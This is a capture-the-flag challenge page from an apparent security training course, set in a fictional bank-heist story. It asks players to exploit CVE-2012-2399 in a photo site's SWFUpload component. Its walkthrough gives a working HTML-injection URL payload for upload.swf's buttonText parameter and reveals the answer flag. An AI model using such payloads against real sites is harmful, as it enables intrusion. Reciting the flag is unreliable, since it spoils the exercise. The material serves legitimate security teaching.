# 💣 Exposure - L11 C10

One of the Bulldogs, Lara Mindsay, is a surveillance expert and we think she's been using advanced drones to take high resolution photos of the bank from different angles.

She also runs a small legit side project, a photo site which allows anyone to create an account and upload photos. We think she's using it herself to store the bank surveillance photos and so we want to see if it's vulnerable. We've been penetration testing the site but have not had any success so far, then this morning one of the other agents sent me a tip - CVE-2012-2399. Take a look and see if you can use it to see if the site is vulnerable.

**Tip:** Find the vulnerability to get the flag.

<details><summary>

## Need a hint?</summary>

> 💡 Hint: What does google say about the CVE? Are there examples of ways to take advantage of this flaw? If there are then try them out!

</details>

<details><summary>

## Step by Step</summary>

- Insert the following as the url

`https://www.photobobbins.com/upload.swf?buttonText=test%3Cimg%20src=%27http://demo.swfupload.org/v220/images/logo.gif%27%3E`

- The flag should show up

`flag: rbvhuK8ROZ3ZTrfxPfyY`

</details>
